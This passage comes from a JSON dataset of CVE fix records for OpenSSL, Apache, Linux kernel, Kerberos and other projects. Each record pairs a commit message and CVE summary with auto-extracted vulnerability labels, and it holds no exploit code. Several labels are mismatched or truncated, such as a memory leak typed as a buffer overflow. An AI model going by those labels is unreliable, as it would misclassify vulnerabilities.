Vector":"via a crafted unserialize call that leverages improper handling of duplicate numerical keys within the serialized properties of an object","Impact":"execute arbitrary code","Root Cause":"caused by a use-after-free error","Attack Type":"remote attacker"},{"commit_id":"643f0fcf3b8ab09a68f0ecd2aa37aafeda3e63ef","cve_id":"CVE-2015-0228","cwe_id":"CWE-20","commit_message":"  *) SECURITY: CVE-2015-0228 (cve.mitre.org)\n     mod_lua: A maliciously crafted websockets PING after a script\n     calls r:wsupgrade() can cause a child process crash.\n     [Edward Lu <Chaosed0 gmail.com>]\n\nDiscovered by Guido Vranken <guidovranken gmail.com>\n\nSubmitted by: Edward Lu\nCommitted by: covener\n\n\n\ngit-svn-id: https:\/\/svn.apache.org\/repos\/asf\/httpd\/httpd\/trunk@1657261 13f79535-47bb-0310-9956-ffa450edef68","summary":"The lua_websocket_read function in lua_request.c in the mod_lua module in the Apache HTTP Server through 2.4.12 allows remote attackers to cause a denial of service (child-process crash) by sending a crafted WebSocket Ping frame after a Lua script has called the wsupgrade function.","commit_message_1":"<cve_id> ( <file>","Vulnerability Type":"Improper Input Validation","Attack Vector":"by sending a crafted websocket ping frame after a lua script has called the wsupgrade function","Impact":"cause a denial of service ( child - process crash )","Root Cause":"caused by a child-process crash vulnerability","Attack Type":"remote attacker"},{"commit_id":"103b171d8fc282ef435f8de9afbf7782e312961f","cve_id":"CVE-2015-0206","cwe_id":"CWE-119","commit_message":"A memory leak can occur in dtls1_buffer_record if either of the calls to\nssl3_setup_buffers or pqueue_insert fail. The former will fail if there is a\nmalloc failure, whilst the latter will fail if attempting to add a duplicate\nrecord to the queue. This should never happen because duplicate records should\nbe detected and dropped before any attempt to add them to the queue.\nUnfortunately records that arrive that are for the next epoch are not being\nrecorded correctly, and therefore replays are not being detected.\nAdditionally, these \"should not happen\" failures that can occur in\ndtls1_buffer_record are not being treated as fatal and therefore an attacker\ncould exploit this by sending repeated replay records for the next epoch,\neventually causing a DoS through memory exhaustion.\n\nThanks to Chris Mueller for reporting this issue and providing initial\nanalysis and a patch. Further analysis and the final patch was performed by\nMatt Caswell from the OpenSSL development team.\n\nCVE-2015-0206\n\nReviewed-by: Dr Stephen Henson <steve@openssl.org>","summary":"Memory leak in the dtls1_buffer_record function in d1_pkt.c in OpenSSL 1.0.0 before 1.0.0p and 1.0.1 before 1.0.1k allows remote attackers to cause a denial of service (memory consumption) by sending many duplicate records for the next epoch, leading to failure of replay detection.","commit_message_1":"a memory leak can occur in dtls1_buffer_record if either of the call to ssl3_setup_buffers or pqueue_insert fail","Vulnerability Type":"buffer overflow","Attack Vector":"by sending many duplicate records for the next epoch , leading to failure of replay detection","Impact":"cause a denial of service ( memory consumption )","Root Cause":"caused by a memory leak","Attack Type":"remote attacker"},{"commit_id":"1421e0c584ae9120ca1b88098f13d6d2e90b83a3","cve_id":"CVE-2015-0205","cwe_id":"CWE-310","commit_message":"Unauthenticated DH client certificate fix.\n\nFix to prevent use of DH client certificates without sending\ncertificate verify message.\n\nIf we've used a client certificate to generate the premaster secret\nssl3_get_client_key_exchange returns 2 and ssl3_get_cert_verify is\nnever called.\n\nWe can only skip the certificate verify message in\nssl3_get_cert_verify if the client didn't send a certificate.\n\nThanks to Karthikeyan Bhargavan for reporting this issue.\nCVE-2015-0205\nReviewed-by: Matt Caswell <matt@openssl.org>","summary":"The ssl3_get_cert_verify function in s3_srvr.c in OpenSSL 1.0.0 before 1.0.0p and 1.0.1 before 1.0.1k accepts client authentication with a Diffie-Hellman (DH) certificate without requiring a CertificateVerify message, which allows remote attackers to obtain access without knowledge of a private key via crafted TLS Handshake Protocol traffic to a server that recognizes a Certification Authority with DH support.","commit_message_1":"unauthenticated dh client certificate fix","Vulnerability Type":"Cryptographic Issues","Attack Vector":"via crafted tls handshake protocol traffic to a server that recognizes a certification","Impact":"bypass security restrictions","Root Cause":"caused by the acceptance of a DH certificate for client authentication without verification","Attack Type":"remote attacker"},{"commit_id":"ce325c60c74b0fa784f5872404b722e120e5cab0","cve_id":"CVE-2015-0204","cwe_id":"CWE-310","commit_message":"Only allow ephemeral RSA keys in export ciphersuites.\n\nOpenSSL clients would tolerate temporary RSA keys in non-export\nciphersuites. It also had an option SSL_OP_EPHEMERAL_RSA which\nenabled this server side. Remove both options as they are a\nprotocol violation.\n\nThanks to Karthikeyan Bhargavan for reporting this issue.\n(CVE-2015-0204)\nReviewed-by: Matt Caswell <matt@openssl.org>","summary":"The ssl3_get_key_exchange function in s3_clnt.c in OpenSSL before 0.9.8zd, 1.0.0 before 1.0.0p, and 1.0.1 before 1.0.1k allows remote SSL servers to conduct RSA-to-EXPORT_RSA downgrade attacks and facilitate brute-force decryption by offering a weak ephemeral RSA key in a noncompliant role, related to the *FREAK* issue.  NOTE: the scope of this CVE is only client code based on OpenSSL, not EXPORT_RSA issues associated with servers or other TLS implementations.","commit_message_1":"only allow ephemeral rsa key in export ciphersuites","Vulnerability Type":"Cryptographic Issues","Attack Vector":"by offering a weak ephemeral rsa key in a noncomplian","Impact":"conduct rsa - to - export _ rsa downgrade attacks and facilitate brute - force decryption","Root Cause":"facilitate brute-force decryption of TLS\/SSL traffic between vulnerable clients and servers","Attack Type":"remote attacker"},{"commit_id":"725c7dbb95bfaf8b4bb7b04820e3a00cceea9ce6","cve_id":"CVE-2014-9756","cwe_id":"CWE-189","commit_message":"src\/file_io.c : Prevent potential divide-by-zero.\n\nCloses: https:\/\/github.com\/erikd\/libsndfile\/issues\/92","summary":"The psf_fwrite function in file_io.c in libsndfile allows attackers to cause a denial of service (divide-by-zero error and application crash) via unspecified vectors related to the headindex variable.","commit_message_1":"src\/<file> : prevent potential divide-by-zero","Vulnerability Type":"Numeric Errors","Attack Vector":"via unspecified vectors related to the headindex variable","Impact":"cause a denial of service ( divide - by - zero error and application crash )","Root Cause":"caused by improper validation of arguments by the file_io.c","Attack Type":"remote attacker"},{"commit_id":"0e5cc9a40ada6046e6bc3bdfcd0c0d7e4b706b14","cve_id":"CVE-2014-9731","cwe_id":"CWE-17","commit_message":"udf: Check path length when reading symlink\n\nSymlink reading code does not check whether the resulting path fits into\nthe page provided by the generic code. This isn't as easy as just\nchecking the symlink size because of various encoding conversions we\nperform on path. So we have to check whether there is still enough space\nin the buffer on the fly.\n\nCC: stable@vger.kernel.org\nReported-by: Carl Henrik Lunde <chlunde@ping.uio.no>\nSigned-off-by: Jan Kara <jack@suse.cz>","summary":"The UDF filesystem implementation in the Linux kernel before 3.18.2 does not ensure that space is available for storing a symlink target's name along with a trailing 0 character, which allows local users to obtain sensitive information via a crafted filesystem image, related to fs\/udf\/symlink.c and fs\/udf\/unicode.c.","commit_message_1":"check path length when reading symlink symlink reading code doe not check whether the resulting path fit into the page provided by the generic code","Vulnerability Type":"DEPRECATED: Code","Attack Vector":"via a crafted filesystem image , related to fs \/ udf \/ symlink . c and fs \/ udf \/ unicode . c","Impact":"obtain sensitive information","Root Cause":"does not ensure that space is available for storing a symlink target ' s name along with a trailing 0 character ,","Attack Type":"local attacker"},{"commit_id":"e237ec37ec154564f8690c5bd1795339955eeef9","cve_id":"CVE-2014-9730","cwe_id":null,"commit_message":"udf: Check component length before reading it\n\nCheck that length specified in a component of a symlink fits in the\ninput buffer we are reading. Also properly ignore component length for\ncomponent types that do not use it. Otherwise we read memory after end\nof buffer for corrupted udf image.\n\nReported-by: Carl Henrik Lunde <chlunde@ping.uio.no>\nCC: stable@vger.kernel.org\nSigned-off-by: Jan Kara <jack@suse.cz>","summary":"The udf_pc_to_char function in fs\/udf\/symlink.c in the Linux kernel before 3.18.2 relies on component lengths that are unused, which allows local users to cause a denial of service (system crash) via a crafted UDF filesystem image.","commit_message_1":"check component length before reading it check that length specified in a component of a symlink fit in the input buffer we are reading","Vulnerability Type":"system crash","Attack Vector":"via a crafted udf filesystem image","Impact":"cause a denial of service ( system crash )","Root Cause":"relies on component lengths that are unused","Attack Type":"local attacker"},{"commit_id":"e159332b9af4b04d882dbcfe1bb0117f0a6d4b58","cve_id":"CVE-2014-9729","cwe_id":null,"commit_message":"udf: Verify i_size when loading inode\n\nVerify that inode size is sane when loading inode with data stored in\nICB. Otherwise we may get confused later when working with the inode and\ninode size is too big.\n\nCC: stable@vger.kernel.org\nReported-by: Carl Henrik Lunde <chlunde@ping.uio.no>\nSigned-off-by: Jan Kara <jack@suse.cz>","summary":"The udf_read_inode function in fs\/udf\/inode.c in the Linux kernel before 3.18.2 does not ensure a certain data-structure size consistency, which allows local users to cause a denial of service (system crash) via a crafted UDF filesystem image.","commit_message_1":"verify i_size when loading inode verify that inode size is sane when loading inode with data stored in icb","Vulnerability Type":"system crash","Attack Vector":"via a crafted udf filesystem image","Impact":"cause a denial of service ( system crash )","Root Cause":"does not ensure a certain data - structure size consistency","Attack Type":"local attacker"},{"commit_id":"b6e3e0f601e2c1ec1f3aac880ed6a3fe63043e51","cve_id":"CVE-2014-9721","cwe_id":"CWE-20","commit_message":"Merge pull request #101 from hintjens\/master\n\nProblem: issue #1273, protocol downgrade attack","summary":"libzmq before 4.0.6 and 4.1.x before 4.1.1 allows remote attackers to conduct downgrade attacks and bypass ZMTP v3 protocol security mechanisms via a ZMTP v2 or earlier header.","commit_message_1":"merge pull request # <number> from hintjens\/master","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a zmtp v2 or earlier header","Impact":"conduct downgrade attacks and bypass zmtp v3 protocol security mechanisms","Root Cause":"caused by the acceptance of malicious connections","Attack Type":"remote attacker"},{"commit_id":"324701c9fd31beb4f070f1b7ef78b115fbdfec34","cve_id":"CVE-2014-9714","cwe_id":"CWE-79","commit_message":"HTMLEncode strings in wddx_serialize_value()\n\nSummary: Strings returned through wddx_serialize_value should be HTMLEncode()'d during\nserialization.\n\nFixes #4283\n\n{sync, type=\"child\", parent=\"internal\", parentrevid=\"1691695\", parentrevfbid=\"1537976659780590\", parentdiffid=\"5726084\"}\n\nReviewed By: @JoelMarcey\n\nDifferential Revision: D1691695\n\nSignature: t1:1691695:1416530595:722bfcdaf7c0dbee379bea886cd4c43d997ca7dd","summary":"Cross-site scripting (XSS) vulnerability in the WddxPacket::recursiveAddVar function in HHVM (aka the HipHop Virtual Machine) before 3.5.0 allows remote attackers to inject arbitrary web script or HTML via a crafted string to the wddx_serialize_value function.","commit_message_1":"string returned through wddx_serialize_value should be htmlencode ( ) 'd during serialization","Vulnerability Type":"Cross-site Scripting","Attack Vector":"via a crafted string to the wddx _ serialize _ value function","Impact":"inject arbitrary web script or html","Root Cause":"caused by improper validation of user-supplied input by the wddx_serialize_value() function","Attack Type":"remote attacker"},{"commit_id":"5f5bc6b1e2d5a6f827bc860ef2dc5b6f365d1339","cve_id":"CVE-2014-9710","cwe_id":"CWE-362","commit_message":"Btrfs: make xattr replace operations atomic\n\nReplacing a xattr consists of doing a lookup for its existing value, delete\nthe current value from the respective leaf, release the search path and then\nfinally insert the new value. This leaves a time window where readers (getxattr,\nlistxattrs) won't see any value for the xattr. Xattrs are used to store ACLs,\nso this has security implications.\n\nThis change also fixes 2 other existing issues which were:\n\n*) Deleting the old xattr value without verifying first if the new xattr will\n   fit in the existing leaf item (in case multiple xattrs are packed in the\n   same item due to name hash collision);\n\n*) Returning -EEXIST when the flag XATTR_CREATE is given and the xattr doesn't\n   exist but we have have an existing item that packs muliple xattrs with\n   the same name hash as the input xattr. In this case we should return ENOSPC.\n\nA test case for xfstests follows soon.\n\nThanks to Alexandre Oliva for reporting the non-atomicity of the xattr replace\nimplementation.\n\nReported-by: Alexandre Oliva <oliva@gnu.org>\nSigned-off-by: Filipe Manana <fdmanana@suse.com>\nSigned-off-by: Chris Mason <clm@fb.com>","summary":"The Btrfs implementation in the Linux kernel before 3.19 does not ensure that the visible xattr state is consistent with a requested replacement, which allows local users to bypass intended ACL settings and gain privileges via standard filesystem operations (1) during an xattr-replacement time window, related to a race condition, or (2) after an xattr-replacement attempt that fails because the data does not fit.","commit_message_1":"make xattr replace operation atomic replacing a xattr consists of doing a lookup for it existing value , delete the current value from the respective leaf , release the search path and then finally insert the new value","Vulnerability Type":"Race Condition","Attack Vector":"via standard filesystem operations ( 1 ) during an xattr - replacement time window , related to a race condition , or ( 2 ) after an xattr - replacement attempt that fails because the data does not fit","Impact":"bypass intended acl settings and gain privileges","Root Cause":"does not ensure that the visible xattr state is consistent with a requested replacement","Attack Type":"local attacker"},{"commit_id":"942080643bce061c3dd9d5718d3b745dcb39a8bc","cve_id":"CVE-2014-9683","cwe_id":"CWE-189","commit_message":"eCryptfs: Remove buggy and unnecessary write in file name decode routine\n\nDmitry Chernenkov used KASAN to discover that eCryptfs writes past the\nend of the allocated buffer during encrypted filename decoding. This\nfix corrects the issue by getting rid of the unnecessary 0 write when\nthe current bit offset is 2.\n\nSigned-off-by: Michael Halcrow <mhalcrow@google.com>\nReported-by: Dmitry Chernenkov <dmitryc@google.com>\nSuggested-by: Kees Cook <keescook@chromium.org>\nCc: stable@vger.kernel.org # v2.6.29+: 51ca58d eCryptfs: Filename Encryption: Encoding and encryption functions\nSigned-off-by: Tyler Hicks <tyhicks@canonical.com>","summary":"Off-by-one error in the ecryptfs_decode_from_filename function in fs\/ecryptfs\/crypto.c in the eCryptfs subsystem in the Linux kernel before 3.18.2 allows local users to cause a denial of service (buffer overflow and system crash) or possibly gain privileges via a crafted filename.","commit_message_1":"remove buggy and unnecessary write in file name decode routine dmitry chernenkov used kasan to discover that ecryptfs writes past the end of the allocated buffer during encrypted filename decoding","Vulnerability Type":"off - by - one error","Attack Vector":"via a crafted filename","Impact":"cause a denial of service ( buffer overflow and system crash ) or possibly gain","Root Cause":"caused by improper bounds checking by fs\/ecryptfs\/crypto.c","Attack Type":"local attacker"},{"commit_id":"445c8fb0ebff85195be94cd9f7e1df89cade5c7f","cve_id":"CVE-2014-9653","cwe_id":"CWE-20","commit_message":"Bail out on partial reads, from Alexander Cherepanov","summary":"readelf.c in file before 5.22, as used in the Fileinfo component in PHP before 5.4.37, 5.5.x before 5.5.21, and 5.6.x before 5.6.5, does not consider that pread calls sometimes read only a subset of the available data, which allows remote attackers to cause a denial of service (uninitialized memory access) or possibly have unspecified other impact via a crafted ELF file.","commit_message_1":"bail out on partial read , from alexander cherepanov","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted elf file","Impact":"cause a denial of service ( uninitialized memory access ) or possibly have unspecified other impact","Root Cause":"does not consider that pread calls sometimes read only a subset of the available data","Attack Type":"remote attacker"},{"commit_id":"59e63838913eee47f5c120a6c53d4565af638158","cve_id":"CVE-2014-9652","cwe_id":"CWE-119","commit_message":"PR\/398: Correctly truncate pascal strings (fixes out of bounds read of 1, 2,\nor 4 bytes).","summary":"The mconvert function in softmagic.c in file before 5.21, as used in the Fileinfo component in PHP before 5.4.37, 5.5.x before 5.5.21, and 5.6.x before 5.6.5, does not properly handle a certain string-length field during a copy of a truncated version of a Pascal string, which might allow remote attackers to cause a denial of service (out-of-bounds memory access and application crash) via a crafted file.","commit_message_1":"correctly truncate pascal string ( fix out of bound read of <number> , <number> , or <number> byte )","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted file","Impact":"cause a denial of service ( out - of - bounds memory access and application crash )","Root Cause":"does not properly handle a certain string - length field during a copy of a truncated version of a pascal string","Attack Type":"remote attacker"},{"commit_id":"4943ba16bbc2db05115707b3ff7b4874e9e3c560","cve_id":"CVE-2014-9644","cwe_id":"CWE-264","commit_message":"crypto: include crypto- module prefix in template\n\nThis adds the module loading prefix \"crypto-\" to the template lookup\nas well.\n\nFor example, attempting to load 'vfat(blowfish)' via AF_ALG now correctly\nincludes the \"crypto-\" prefix at every level, correctly rejecting \"vfat\":\n\n\tnet-pf-38\n\talgif-hash\n\tcrypto-vfat(blowfish)\n\tcrypto-vfat(blowfish)-all\n\tcrypto-vfat\n\nReported-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: Kees Cook <keescook@chromium.org>\nAcked-by: Mathias Krause <minipli@googlemail.com>\nSigned-off-by: Herbert Xu <herbert@gondor.apana.org.au>","summary":"The Crypto API in the Linux kernel before 3.18.5 allows local users to load arbitrary kernel modules via a bind system call for an AF_ALG socket with a parenthesized module template expression in the salg_name field, as demonstrated by the vfat(aes) expression, a different vulnerability than CVE-2013-7421.","commit_message_1":"include crypto- module prefix in template this add the module loading prefix `` crypto- '' to the template lookup a well","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a bind system call for an af _ alg socket with a parenthesized module template expression in the salg _ name field , as demonstrated by the vfat ( aes ) expression , a different vulnerability than cve - 2013 - 7421","Impact":"load arbitrary kernel modules","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"65437cee25199dbd385fb35901bc0011e164276c","cve_id":"CVE-2014-9621","cwe_id":"CWE-399","commit_message":"Limit string printing to 100 chars, and add flags I forgot in the previous\ncommit.","summary":"The ELF parser in file 5.16 through 5.21 allows remote attackers to cause a denial of service via a long string.","commit_message_1":"limit string printing to <number> char , and add flag i forgot in the previous commit","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a long string","Impact":"cause a denial of service","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"ce90e05774dd77d86cfc8dfa6da57b32816841c4","cve_id":"CVE-2014-9620","cwe_id":"CWE-399","commit_message":"- Add a limit to the number of ELF notes processed (Suggested by Alexander\n  Cherepanov)\n- Restructure ELF note printing so that we don't print the same message\n  multiple times on repeated notes of the same kind.","summary":"The ELF parser in file 5.08 through 5.21 allows remote attackers to cause a denial of service via a large number of notes.","commit_message_1":"- add a limit to the number of elf note processed ( suggested by alexander cherepanov ) - restructure elf note printing so that we do n't print the same message multiple time on repeated note of the same kind","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a large number of notes","Impact":"cause a denial of service","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"4e2024624e678f0ebb916e6192bd23c1f9fdf696","cve_id":"CVE-2014-9584","cwe_id":"CWE-20","commit_message":"isofs: Fix unchecked printing of ER records\n\nWe didn't check length of rock ridge ER records before printing them.\nThus corrupted isofs image can cause us to access and print some memory\nbehind the buffer with obvious consequences.\n\nReported-and-tested-by: Carl Henrik Lunde <chlunde@ping.uio.no>\nCC: stable@vger.kernel.org\nSigned-off-by: Jan Kara <jack@suse.cz>","summary":"The parse_rock_ridge_inode_internal function in fs\/isofs\/rock.c in the Linux kernel before 3.18.2 does not validate a length value in the Extensions Reference (ER) System Use Field, which allows local users to obtain sensitive information from kernel memory via a crafted iso9660 image.","commit_message_1":"fix unchecked printing of er record we did n't check length of rock ridge er record before printing them","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted iso9660 image","Impact":"obtain sensitive information from kernel memory","Root Cause":"does not validate a length value","Attack Type":"local attacker"},{"commit_id":"a3a8784454692dd72e5d5d34dcdab17b4420e74c","cve_id":"CVE-2014-9529","cwe_id":"CWE-362","commit_message":"KEYS: close race between key lookup and freeing\n\nWhen a key is being garbage collected, it's key->user would get put before\nthe ->destroy() callback is called, where the key is removed from it's\nrespective tracking structures.\n\nThis leaves a key hanging in a semi-invalid state which leaves a window open\nfor a different task to try an access key->user. An example is\nfind_keyring_by_name() which would dereference key->user for a key that is\nin the process of being garbage collected (where key->user was freed but\n->destroy() wasn't called yet - so it's still present in the linked list).\n\nThis would cause either a panic, or corrupt memory.\n\nFixes CVE-2014-9529.\n\nSigned-off-by: Sasha Levin <sasha.levin@oracle.com>\nSigned-off-by: David Howells <dhowells@redhat.com>","summary":"Race condition in the key_gc_unused_keys function in security\/keys\/gc.c in the Linux kernel through 3.18.2 allows local users to cause a denial of service (memory corruption or panic) or possibly have unspecified other impact via keyctl commands that trigger access to a key structure member during garbage collection of a key.","commit_message_1":"close race between key lookup and freeing when a key is being garbage collected , it 's key- > user would get put before the - > destroy ( ) callback is called , where the key is removed from it 's respective tracking structure","Vulnerability Type":"Race Condition","Attack Vector":"via keyctl commands that trigger access to a key structure member during garbage collection of a key ","Impact":"cause a denial of service ( memory corruption or panic ) or possibly have unspecified other impact","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"dbe14f00030af5d3577f4cabbf9861db59e9c378","cve_id":"CVE-2014-9496","cwe_id":"CWE-119","commit_message":"src\/sd2.c : Fix two potential buffer read overflows.\n\nCloses: https:\/\/github.com\/erikd\/libsndfile\/issues\/93","summary":"The sd2_parse_rsrc_fork function in sd2.c in libsndfile allows attackers to have unspecified impact via vectors related to a (1) map offset or (2) rsrc marker, which triggers an out-of-bounds read.","commit_message_1":"fix two potential buffer read overflow","Vulnerability Type":"buffer overflow","Attack Vector":"via vectors related to a ( 1 ) map offset or ( 2 ) rsrc marker , which triggers an out - of - bounds read","Impact":"have unspecified impact","Root Cause":"caused by the buffer overread flaws","Attack Type":"local attacker"},{"commit_id":"d65686849024838243515b5c40ae2c479460b4b5","cve_id":"CVE-2014-9491","cwe_id":null,"commit_message":"5421 devzvol_readdir() needs to be more careful with strchr\nReviewed by: Keith Wesolowski <keith.wesolowski@joyent.com>\nReviewed by: Jerry Jelinek <jerry.jelinek@joyent.com>\nApproved by: Dan McDonald <danmcd@omniti.com>","summary":"The devzvol_readdir function in illumos does not check the return value of a strchr call, which allows remote attackers to cause a denial of service (NULL pointer dereference and panic) via unspecified vectors.","commit_message_1":"<number> devzvol_readdir ( ) need to be more careful with strchr","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via unspecified vectors","Impact":"cause a denial of service ( pointer dereference and panic )","Root Cause":"does not check the return value of a strchr call","Attack Type":"remote attacker"},{"commit_id":"5b6698b0e4a37053de35cc24ee695b98a7eb712b","cve_id":"CVE-2014-9428","cwe_id":"CWE-399","commit_message":"batman-adv: Calculate extra tail size based on queued fragments\n\nThe fragmentation code was replaced in 610bfc6bc99bc83680d190ebc69359a05fc7f605\n(\"batman-adv: Receive fragmented packets and merge\"). The new code provided a\nmostly unused parameter skb for the merging function. It is used inside the\nfunction to calculate the additionally needed skb tailroom. But instead of\nincreasing its own tailroom, it is only increasing the tailroom of the first\nqueued skb. This is not correct in some situations because the first queued\nentry can be a different one than the parameter.\n\nAn observed problem was:\n\n1. packet with size 104, total_size 1464, fragno 1 was received\n   - packet is queued\n2. packet with size 1400, total_size 1464, fragno 0 was received\n   - packet is queued at the end of the list\n3. enough data was received and can be given to the merge function\n   (1464 == (1400 - 20) + (104 - 20))\n   - merge functions gets 1400 byte large packet as skb argument\n4. merge function gets first entry in queue (104 byte)\n   - stored as skb_out\n5. merge function calculates the required extra tail as total_size - skb->len\n   - pskb_expand_head tail of skb_out with 64 bytes\n6. merge function tries to squeeze the extra 1380 bytes from the second queued\n   skb (1400 byte aka skb parameter) in the 64 extra tail bytes of skb_out\n\nInstead calculate the extra required tail bytes for skb_out also using skb_out\ninstead of using the parameter skb. The skb parameter is only used to get the\ntotal_size from the last received packet. This is also the total_size used to\ndecide that all fragments were received.\n\nReported-by: Philipp Psurek <philipp.psurek@gmail.com>\nSigned-off-by: Sven Eckelmann <sven@narfation.org>\nAcked-by: Martin Hundeb\u00f8ll <martin@hundeboll.net>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The batadv_frag_merge_packets function in net\/batman-adv\/fragmentation.c in the B.A.T.M.A.N. implementation in the Linux kernel through 3.18.1 uses an incorrect length field during a calculation of an amount of memory, which allows remote attackers to cause a denial of service (mesh-node system crash) via fragmented packets.","commit_message_1":"calculate extra tail size based on queued fragment the fragmentation code wa replaced in 610bfc6bc99bc83680d190ebc69359a05fc7f605 ( `` batman-adv : receive fragmented packet and merge '' )","Vulnerability Type":"Resource Management Errors","Attack Vector":"via fragmented packets","Impact":"cause a denial of service ( mesh - node system crash )","Root Cause":"uses an incorrect length field during a calculation of an amount of memory","Attack Type":"remote attacker"},{"commit_id":"5bb8a6b9c9eb8dd22bc9526751610aaa255ead9c","cve_id":"CVE-2014-9423","cwe_id":"CWE-200","commit_message":"Fix gssrpc data leakage [CVE-2014-9423]\n\n[MITKRB5-SA-2015-001] In svcauth_gss_accept_sec_context(), do not copy\nbytes from the union context into the handle field we send to the\nclient.  We do not use this handle field, so just supply a fixed\nstring of \"xxxx\".\n\nIn gss_union_ctx_id_struct, remove the unused \"interposer\" field which\nwas causing part of the union context to remain uninitialized.\n\nticket: 8058 (new)\ntarget_version: 1.13.1\ntags: pullup","summary":"The svcauth_gss_accept_sec_context function in lib\/rpc\/svc_auth_gss.c in MIT Kerberos 5 (aka krb5) 1.11.x through 1.11.5, 1.12.x through 1.12.2, and 1.13.x before 1.13.1 transmits uninitialized interposer data to clients, which allows remote attackers to obtain sensitive information from process heap memory by sniffing the network for data in a handle field.","commit_message_1":"fix gssrpc data leakage [ <cve_id> ] [ mitkrb5-sa-<number>-<number> ] in svcauth_gss_accept_sec_context ( ) , do not copy byte from the union context into the handle field we send to the client","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by the libgssrpc application","Impact":"obtain sensitive information","Root Cause":"caused by the leak of 4-byte or 8-byte portions of uninitialized memory to the network by the libgssrpc application","Attack Type":"remote attacker"},{"commit_id":"6609658db0799053fbef0d7d0aa2f1fd68ef32d8","cve_id":"CVE-2014-9422","cwe_id":"CWE-284","commit_message":"Fix kadmind server validation [CVE-2014-9422]\n\n[MITKRB5-SA-2015-001] In kadmind's check_rpcsec_auth(), use\ndata_eq_string() instead of strncmp() to check components of the\nserver principal, so that we don't erroneously match left substrings\nof \"kadmin\", \"history\", or the realm.\n\nticket: 8057 (new)\ntarget_version: 1.13.1\ntags: pullup","summary":"The check_rpcsec_auth function in kadmin\/server\/kadm_rpc_svc.c in kadmind in MIT Kerberos 5 (aka krb5) through 1.11.5, 1.12.x through 1.12.2, and 1.13.x before 1.13.1 allows remote authenticated users to bypass a kadmin\/* authorization check and obtain administrative access by leveraging access to a two-component principal with an initial *kadmind* substring, as demonstrated by a *ka\/x* principal.","commit_message_1":"fix kadmind server validation [ <cve_id> ] [ mitkrb5-sa-<number>-<number> ] in kadmind 's check_rpcsec_auth ( ) , use data_eq_string ( ) instead of strncmp ( ) to check component of the server principal , so that we do n't erroneously match left substring of `` kadmin '' , `` history '' , or the realm","Vulnerability Type":"Improper Access Control","Attack Vector":"by leveraging access to a two-component principal with an initial *kadmind* substring","Impact":"bypass a kadmin \/ * authorization check and obtain administrative access","Root Cause":"caused by the acceptance of authentications to two-component server principals","Attack Type":"remote attacker"},{"commit_id":"a197e92349a4aa2141b5dff12e9dd44c2a2166e3","cve_id":"CVE-2014-9421","cwe_id":null,"commit_message":"Fix kadm5\/gssrpc XDR double free [CVE-2014-9421]\n\n[MITKRB5-SA-2015-001] In auth_gssapi_unwrap_data(), do not free\npartial deserialization results upon failure to deserialize.  This\nresponsibility belongs to the callers, svctcp_getargs() and\nsvcudp_getargs(); doing it in the unwrap function results in freeing\nthe results twice.\n\nIn xdr_krb5_tl_data() and xdr_krb5_principal(), null out the pointers\nwe are freeing, as other XDR functions such as xdr_bytes() and\nxdr_string().\n\nticket: 8056 (new)\ntarget_version: 1.13.1\ntags: pullup","summary":"The auth_gssapi_unwrap_data function in lib\/rpc\/auth_gssapi_misc.c in MIT Kerberos 5 (aka krb5) through 1.11.5, 1.12.x through 1.12.2, and 1.13.x before 1.13.1 does not properly handle partial XDR deserialization, which allows remote authenticated users to cause a denial of service (use-after-free and double free, and daemon crash) or possibly execute arbitrary code via malformed XDR data, as demonstrated by data sent to kadmind.","commit_message_1":"fix kadm5\/gssrpc xdr double free [ <cve_id> ] [ mitkrb5-sa-<number>-<number> ] in auth_gssapi_unwrap_data ( ) , do not free partial deserialization result upon failure to deserialize","Vulnerability Type":"use - after - free","Attack Vector":"via malformed xdr data , as demonstrated by data","Impact":"to cause a denial of service ( use - after - free and double free , and daemon crash ) or possibly execute arbitrary code","Root Cause":"does not properly handle partial xdr deserialization","Attack Type":"remote attacker"},{"commit_id":"cb62ab4b17818fe66d2fed0a7fe71969131c811b","cve_id":"CVE-2014-8275","cwe_id":"CWE-310","commit_message":"use correct function name\n\nReviewed-by: Rich Salz <rsalz@openssl.org>\nReviewed-by: Matt Caswell <matt@openssl.org>","summary":"OpenSSL before 0.9.8zd, 1.0.0 before 1.0.0p, and 1.0.1 before 1.0.1k does not enforce certain constraints on certificate data, which allows remote attackers to defeat a fingerprint-based certificate-blacklist protection mechanism by including crafted data within a certificate's unsigned portion, related to crypto\/asn1\/a_verify.c, crypto\/dsa\/dsa_asn1.c, crypto\/ecdsa\/ecs_vrf.c, and crypto\/x509\/x_all.c.","commit_message_1":"use correct function name","Vulnerability Type":"Cryptographic Issues","Attack Vector":"by including crafted data within a certificate ' s unsigned portion , related to crypto \/ asn1 \/ a _ verify . c , crypto \/ dsa \/ dsa _ asn1 . c , crypto \/ ecdsa \/ ecs _ vrf . c , and crypto \/ x509 \/ x","Impact":"defeat a fingerprint - based certificate - blacklist protection mechanism","Root Cause":"does not enforce certain constraints on certificate data ","Attack Type":"remote attacker"},{"commit_id":"470990fee0182566d439ef7e82d1abf18b7085d7","cve_id":"CVE-2014-8176","cwe_id":"CWE-119","commit_message":"Free up s->d1->buffered_app_data.q properly.\n\nPR#3286","summary":"The dtls1_clear_queues function in ssl\/d1_lib.c in OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h frees data structures without considering that application data can arrive between a ChangeCipherSpec message and a Finished message, which allows remote DTLS peers to cause a denial of service (memory corruption and application crash) or possibly have unspecified other impact via unexpected application data.","commit_message_1":"free up s- > d1- > <file> properly","Vulnerability Type":"buffer overflow","Attack Vector":"via unexpected application data","Impact":"cause a denial of service ( memory corruption and application crash","Root Cause":"caused by an invalid free error when application data between the ChangeCipherSpec and Finished messages is received by the DTLS peer","Attack Type":"remote 